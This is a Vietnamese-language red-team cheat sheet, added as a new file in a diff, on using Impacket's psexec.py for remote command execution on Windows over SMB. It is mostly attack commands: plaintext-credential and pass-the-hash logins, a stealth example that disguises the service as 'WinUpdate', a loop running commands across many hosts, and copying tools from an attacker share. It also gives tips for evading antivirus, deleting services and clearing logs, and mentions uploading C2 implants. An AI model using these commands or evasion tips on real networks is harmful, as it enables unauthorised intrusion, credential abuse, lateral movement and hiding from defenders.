@@ -1,0 +1,149 @@
+1. psexec.py là gì?
+
+    psexec.py là script của Impacket, giúp thực thi lệnh (RCE) từ xa trên Windows qua SMB.
+
+    Tận dụng quyền admin (hoặc SYSTEM, local admin) để:
+
+        Chạy lệnh bất kỳ, upload file, mở shell CMD/SYSTEM, thực thi script, lateral movement, post-exploitation…
+
+        Không cần mở RDP hay WinRM, bypass nhiều GPO/AV, cực kỳ mạnh cho Red Team/Pentest.
+
+    Hoạt động giống PsExec.exe của Sysinternals/Microsoft, nhưng chạy trên Linux/macOS, hỗ trợ pass-the-hash, automation, script hóa…
+
+2. Cài đặt psexec.py (Impacket)
+A. Trên Kali/Ubuntu/Debian
+
+sudo apt update
+sudo apt install python3-impacket
+
+(Script thường ở /usr/bin/psexec.py hoặc /usr/share/doc/python3-impacket/examples/psexec.py)
+B. Cài bản mới nhất từ GitHub (khuyên dùng)
+
+git clone https://github.com/fortra/impacket.git
+cd impacket
+pip install .
+
+    Script trong examples/psexec.py
+
+3. Remote Command Execution (RCE) với psexec.py – cơ bản
+A. Kết nối CMD shell vào máy target
+
+python3 psexec.py <domain>/<user>:<pass>@<target_IP>
+
+Ví dụ:
+
+python3 psexec.py megacorp.local/administrator:Password123@10.10.10.100
+
+    Nếu thành công, sẽ hiện ra shell giống CMD (SYSTEM privilege!).
+
+B. Dùng NTLM hash (Pass-the-Hash)
+
+python3 psexec.py <domain>/<user>:<LM>:<NT>@<target_IP>
+
+Ví dụ:
+
+python3 psexec.py hackthebox.local/admin:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0@10.10.10.101
+
+    Không cần pass, chỉ cần hash NTLM (có thể lấy bằng secretsdump.py, crackmapexec, mimikatz...)
+
+C. Không cần domain
+
+python3 psexec.py administrator:Password123@10.10.10.100
+
+4. Thực thi lệnh tự động (không cần shell)
+
+Chạy một lệnh đơn và thoát luôn:
+
+python3 psexec.py <domain>/<user>:<pass>@<target_IP> 'ipconfig /all'
+
+Ví dụ:
+
+python3 psexec.py administrator:Password123@10.10.10.100 'whoami && hostname'
+
+5. Upload file (lateral movement, malware, script, tool)
+
+    Upload rồi thực thi:
+
+        Trong shell của psexec.py, dùng lệnh CMD tiêu chuẩn:
+
+        copy \\attacker_ip\share\tool.exe C:\Windows\Temp\tool.exe
+        C:\Windows\Temp\tool.exe
+
+        Hoặc upload tool qua SMB, rồi run trực tiếp.
+
+        Kết hợp với các tool như mimikatz, seatbelt, winPEAS, SharpHound, chisel...
+
+6. Tùy chọn nâng cao, stealth & automation
+Tham số	Ý nghĩa
+-hashes <LM>:<NT>	Pass-the-hash, không cần pass thật
+-service-name <tên>	Đổi tên dịch vụ tạm thời khi chạy, stealth hơn
+-k	Sử dụng Kerberos TGT đã có
+-no-pass	Không yêu cầu pass (dùng khi TGT đã load với kinit)
+-port <port>	Chọn port SMB khác (default 445)
+-debug	Debug output
+-file <file>	Upload rồi run trực tiếp script/batch
+
+Ví dụ stealth:
+
+python3 psexec.py administrator@10.10.10.10 -hashes :9b19c12d8a15e0d6f47c0a08c8d6e6b3 -service-name WinUpdate
+
+7. Automation – quét, run lệnh hàng loạt
+
+    Quét nhiều host trong nội bộ:
+
+    for ip in $(cat hosts.txt); do
+      python3 psexec.py administrator:Password123@$ip 'whoami' >> output.txt
+    done
+
+    Dùng với Cobalt Strike, Metasploit:
+
+        Đôi khi dùng psexec.py để upload implant, shellcode, hoặc tạo foothold cho C2.
+
+8. Workflow pentest/red team thực chiến với psexec.py
+
+    Enum/Crack cred (admin/hash) bằng CME, secretsdump, kerbrute, bloodhound...
+
+    Psexec.py RCE – upload shell, thực thi lệnh, dump hash, lateral movement
+
+    Escalate quyền (nếu cần), pivot tiếp sang máy khác
+
+    Automation, script hóa toàn bộ quá trình, log output
+
+9. Fix lỗi & mẹo thực tế
+Lỗi	Fix
+STATUS_LOGON_FAILURE	Sai user/pass/hash, check domain, thử pass-the-hash
+Access Denied	User không đủ quyền (phải là admin hoặc local admin)
+Bị AV phát hiện	Đổi tên service, xóa service sau khi run, obfuscate tool
+Không vào được shell	Check port 445, firewall, SMB version, hoặc dùng WinRM/Evil-WinRM thay thế
+CMD lỗi Unicode	Dùng powershell encode-base64, hoặc upload file script rồi run
+10. So sánh với các tool khác
+Tool	Ưu điểm psexec.py	Nhược điểm
+psexec.py	Chạy cross-OS, pass hash, script hóa, stealth	Chỉ dùng cho SMB, cần quyền admin
+PsExec.exe	Native Windows, nhiều option	Không pass hash, khó automation Linux
+winexe	Tương tự, chạy trên Linux	Không mạnh bằng psexec.py
+CrackMapExec	Spray, run lệnh SMB, nhiều module	Không shell tương tác như psexec.py
+Evil-WinRM	Shell đẹp, powershell mạnh	Chỉ dùng WinRM (5985/5986)
+11. Tài liệu, link hữu ích
+
+    Impacket Github
+
+    Impacket – psexec.py
+
+    Hacktricks – PsExec/SMB
+
+    PayloadAllTheThings Lateral Movement
+
+    psexec.py help
+
+    python3 psexec.py -h
+
+Tóm tắt nhanh
+
+    psexec.py là tool cực mạnh thực thi lệnh/quản trị Windows từ xa qua SMB, hỗ trợ pass hash, automation, upload/run file, lateral movement... — rất hiệu quả khi có quyền admin.
+
+    Dùng cho RCE, privilege escalation, pivot, post-exploitation, CTF, audit nội bộ.
+
+    Kết hợp với CME, secretsdump, bloodhound, mimikatz… để kiểm soát toàn bộ AD nội bộ.
+
+    Nên dùng stealth (đổi service, xoá log), luôn script hóa/quản lý output, không lạm dụng vào mục đích bất hợp pháp.
+
